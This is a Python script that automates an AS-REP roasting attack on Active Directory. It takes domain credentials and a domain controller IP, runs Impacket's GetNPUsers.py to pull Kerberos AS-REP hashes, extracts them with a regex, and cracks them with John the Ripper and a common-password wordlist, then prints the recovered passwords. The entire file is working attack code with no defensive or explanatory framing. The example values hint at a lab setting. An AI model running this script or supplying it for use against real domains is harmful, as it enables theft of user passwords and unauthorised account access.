import subprocess
import shlex
import re
import tempfile

def main():
    # Get user inputs
    domain = input("Enter the domain (e.g., hacked.local): ")
    user = input("Enter the username (e.g., Paul): ")
    password = input("Enter the password (e.g., Password01): ")
    dc_ip = input("Enter the domain controller IP (e.g., 192.168.80.250): ")

    # Build the command
    get_np_users_cmd = f"/usr/share/doc/python3-impacket/examples/GetNPUsers.py {domain}/{user}:{password} -dc-ip {dc_ip} -request"

    # Run the command
    process = subprocess.Popen(shlex.split(get_np_users_cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    # Print the command output
    print("Output:\n")
    print(stdout.decode('utf-8'))

    if stderr:
        print("Error:\n")
        print(stderr.decode('utf-8'))

    # Extract hashes
    hash_pattern = re.compile(r'(\$krb5asrep\$23\$[\w\.-]+@[\w\.-]+:.+)')
    hashes = hash_pattern.findall(stdout.decode('utf-8'))

    if not hashes:
        print("No hashes found.")
        return

    # Save hashes to a temporary file
    with tempfile.NamedTemporaryFile(mode='w', delete=False) as hash_file:
        for h in hashes:
            hash_file.write(f"{h}\n")
        hash_file_name = hash_file.name

    # Crack hashes with John
    password_list = "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
    john_cmd = f"john --wordlist={password_list} --format=krb5asrep {hash_file_name}"

    process = subprocess.Popen(shlex.split(john_cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    # Print John's output
    print("John the Ripper Output:\n")
    print(stdout.decode('utf-8'))

    if stderr:
        print("John the Ripper Error:\n")
        print(stderr.decode('utf-8'))

    # Show cracked passwords
    john_show_cmd = f"john --show {hash_file_name}"
    process = subprocess.Popen(shlex.split(john_show_cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()

    print("Cracked Passwords:\n")
    print(stdout.decode('utf-8'))

    if stderr:
        print("John the Ripper Show Error:\n")
        print(stderr.decode('utf-8'))

if __name__ == "__main__":
    main()
